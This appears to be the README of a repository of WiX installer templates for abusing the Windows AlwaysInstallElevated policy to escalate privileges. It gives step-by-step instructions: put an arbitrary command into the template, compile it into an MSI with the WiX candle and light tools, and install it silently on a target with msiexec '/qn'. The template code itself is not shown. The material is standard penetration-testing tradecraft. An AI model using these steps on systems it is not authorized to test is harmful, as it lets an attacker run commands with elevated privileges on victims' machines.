# MSI-AlwaysInstallElevated
A Collection of templates that can be used for abusing window's AlwaysInstallElevated policy



## WXS Templates Usage

Instructions:  
1. Change the first "ExeCommand" variable to desired command  
2. Download the [WiX Toolset Binaries](https://github.com/wixtoolset/wix3/releases/tag/wix3112rtm)
3. Compile alwaysInstallElevated.msi by running:  
&nbsp;&nbsp;&nbsp;&nbsp;`candle alwaysInstallElevated.wxs`  
&nbsp;&nbsp;&nbsp;&nbsp;`light alwaysInstallElevated.wixobj`  
4. Execute on target by running:  
&nbsp;&nbsp;&nbsp;&nbsp;`alwaysInstallElevated.msi /q`
    - or use `msiexec` implecitely 
        
        `msiexec /i alwaysInstallElevated.msi /qn`
    - To uninstall it
        
        `msiexec /x alwaysInstallElevated.msi /qn`
